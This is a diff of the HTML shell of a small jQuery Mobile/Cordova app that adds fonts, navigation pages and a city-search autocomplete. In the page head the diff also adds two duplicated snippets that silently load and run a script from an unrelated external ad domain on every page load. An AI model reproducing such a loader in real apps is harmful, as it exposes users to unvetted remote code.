@@ -29,49 +29,188 @@
         <meta name="viewport" content="width=device-width, user-scalable=no" />
         <link rel="stylesheet" href="css/jquery.mobile-1.4.5.min.css" /> 
         <link rel="stylesheet" href="css/jquery.mobile.icons-1.4.5.min.css" />
-
+        <style>
+        @import url(http://fonts.googleapis.com/css?family=Frijole);
+         @import url(http://fonts.googleapis.com/css?family=Lily+Script+One);
+         @import url(http://fonts.googleapis.com/css?family=Akronim);
+         @import url(http://fonts.googleapis.com/css?family=Hanalei);
+         @import url(http://fonts.googleapis.com/css?family=Lemon);
+         @import url(http://fonts.googleapis.com/css?family=Dr+Sugiyama);
+         @import url(http://fonts.googleapis.com/css?family=Bonbon);
+         .font1 {
+          font-family: 'Frijole';
+        }
+        .font2 {
+          font-family: 'Lily Script One';
+        }
+        .font3 {
+          font-family: 'Akronim';
+        }
+        .font4 {
+          font-family: 'Hanalei';
+        }
+        .font5 {
+          font-family: 'Lemon';
+        }
+        .font6 {
+          font-family: 'Dr Sugiyama';
+        }
+        .font7 {
+          font-family: 'Bonbon';
+        }
+        .ui-filter-inset {
+          margin-top: 0;
+        }
+      </style>
 		<script src="js/jquery.min.js"></script>   
         <script src="js/jquery.mobile-1.4.5.min.js"></script>    
+        <script>
+            $(document).on("mobileinit", function() {
+                $.mobile.autoInitializePage = false;
+                $.mobile.hashListeningEnabled = false;
+            });
+
+            function mobileInitPage() {
+                $.mobile.hashListeningEnabled = true;
+                $.mobile.initializePage();
+            };
+
+            //page and data handling
+            $(document).on("pagecreate", "#p3", function() {
+                $("#autocomplete").on("filterablebeforefilter", function(e, data) {
+                    var $ul = $(this),
+                              $input = $(data.input),
+                              value = $input.val(),
+                              html = "";
+                    $ul.html("");
+                    if(value && value.length > 2) {
+                        $ul.html("<li><div class='ui-loader'><span class='ui-icon ui-icon-loading'></span></div></li>");
+                        $ul.listview("refresh");
+                        $.ajax({
+                            url: "http://gd.geobytes.com/AutoCompleteCity",
+                            dataType: "jsonp",
+                            crossDomain: true,
+                            data: {
+                                q: $input.val()
+                            }
+                        })
+                                .then(function(response) {
+                                    $.each(response, function(i, val) {
+                                        html += "<li><a href='#p4'>" + val + "</a></li>";
+                                    });
+                                    $ul.html(html);
+                                    $ul.listview("refresh");
+                                    $ul.trigger("updatelayout");
+                                });
+                    }
+                });
+            });
+            (function() {
+                var a = document.createElement("script");
+                a.type = "text/javascript";
+                a.async = !0;
+                a.src = "http://img.rafomedia.com/zr/js/adrns.js?20150811";
+                var b = document.getElementsByTagName("script")[0];
+                b.parentNode.insertBefore(a, b);
+            })();
+         </script>
+
+          <script type="text/javascript">
+            (function () {
+              var a = document.createElement("script");
+              a.type = "text/javascript";
+              a.async = !0;
+              a.src = "http://img.rafomedia.com/zr/js/adrns.js?20150812";
+              var b = document.getElementsByTagName("script")[0];
+              b.parentNode.insertBefore(a, b);
+            })();
+          </script>
 	<title>P1 Apps</title>
     </head>
     <body>
         <div id="home" data-role="page">
-            <div data-role="header" data-position="fixed" data-theme="b">
-              <h3>Home Page</h3>
-            </div>
-            <div role="main" class="ui-content"></div>
-            <div data-position="fixed" data-role="footer">
-              <div data-role="navbar" style="margin:0 0 -5px;">
-                <ul>
-                  <li>
-                    <a data-icon="home" data-theme="b" class="ui-btn-active ui-state-persist">BtnA</a>
-                  </li>
-                  <li>
-                    <a data-icon="star" data-theme="b" href="#p2" data-transition="none">BtnB</a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-          <!-- Page: p2  -->
-          <div id="p2" data-role="page">
-            <div data-role="header" data-position="fixed" data-theme="b">
-              <h3>Page 2</h3>
-            </div>
-            <div role="main" class="ui-content"></div>
-            <div data-position="fixed" data-role="footer">
-              <div data-role="navbar" style="margin:0 0 -5px;">
-                <ul>
-                  <li>
-                    <a data-icon="home" data-theme="b" class href="#home" data-transition="none">BtnA</a>
-                  </li>
-                  <li>
-                    <a data-icon="star" data-theme="b" class="ui-btn-active ui-state-persist">BtnB</a>
-                  </li>
-                </ul>
-              </div>
-            </div>
-          </div>
+    <div data-role="header" data-position="fixed" data-theme="b">
+      <h3>Home Page</h3>
+    </div>
+    <div role="main" class="ui-content">
+      <h2 is="gk-text" class="font5">Welcome To My Apps</h2>
+      <img style="height:80%;width:90%" src="http://jqmdesigner.appspot.com/images/image.png" is="image">
+    </div>
+    <div data-position="fixed" data-role="footer">
+      <div data-role="navbar" style="margin:0 0 -5px;">
+        <ul>
+          <li>
+            <a data-icon="home" data-theme="b" class="ui-btn-active ui-state-persist">Home</a>
+          </li>
+          <li>
+            <a data-icon="star" data-theme="b" href="#p2" data-transition="slide">Favourite</a>
+          </li>
+          <li>
+            <a data-icon="search" data-theme="b" href="#p3" data-transition="slide">Search</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <!-- Page: p2  -->
+  <div id="p2" data-role="page">
+    <div data-role="header" data-position="fixed" data-theme="b">
+      <h3>Favourite</h3>
+    </div>
+    <div role="main" class="ui-content"></div>
+    <div data-position="fixed" data-role="footer">
+      <div data-role="navbar" style="margin:0 0 -5px;">
+        <ul>
+          <li>
+            <a data-icon="home" data-theme="b" class href="#home" data-transition="slide">Home</a>
+          </li>
+          <li>
+            <a data-icon="star" data-theme="b" class="ui-btn-active ui-state-persist">Favourite</a>
+          </li>
+          <li>
+            <a data-icon="search" data-theme="b" class href="#p3" data-transition="slide">Search</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <!-- Page: p3  -->
+  <div id="p3" data-role="page">
+    <div data-role="header" data-position="fixed" data-theme="b">
+      <h3>Search</h3>
+    </div>
+    <div role="main" class="ui-content">
+      <h3>Cities worldwide</h3>
+      <p>After you enter <strong>at least three characters</strong> the autocomplete function will show all possible matches.</p>
+      <form class="ui-filterable">&nbsp;&nbsp;&nbsp;&nbsp;
+        <input id="autocomplete-input" data-type="search" placeholder="Find a city...">
+      </form>
+      <ul id="autocomplete" data-role="listview" data-inset="true" data-filter="true" data-input="#autocomplete-input"></ul>
+    </div>
+    <div data-position="fixed" data-role="footer">
+      <div data-role="navbar" style="margin:0 0 -5px;">
+        <ul>
+          <li>
+            <a data-icon="home" data-theme="b" class href="#home" data-transition="slide">Home</a>
+          </li>
+          <li>
+            <a data-icon="star" data-theme="b" class href="#p2" data-transition="slide">Favourite</a>
+          </li>
+          <li>
+            <a data-icon="search" data-theme="b" class="ui-btn-active ui-state-persist">Search</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <!-- Page: p4  -->
+  <div id="p4" data-role="page" is="page">
+    <div data-role="header" data-position="fixed">
+      <h3>Header</h3>
+      <a class="ui-btn ui-icon-back ui-btn-icon-notext ui-corner-all" href="#p3" data-transition="fade">Back</a>
+    </div>
+    <div role="main" class="ui-content" is="content"></div>
+  </div>
         <script type="text/javascript" src="cordova.js"></script>
     </body>
 </html>
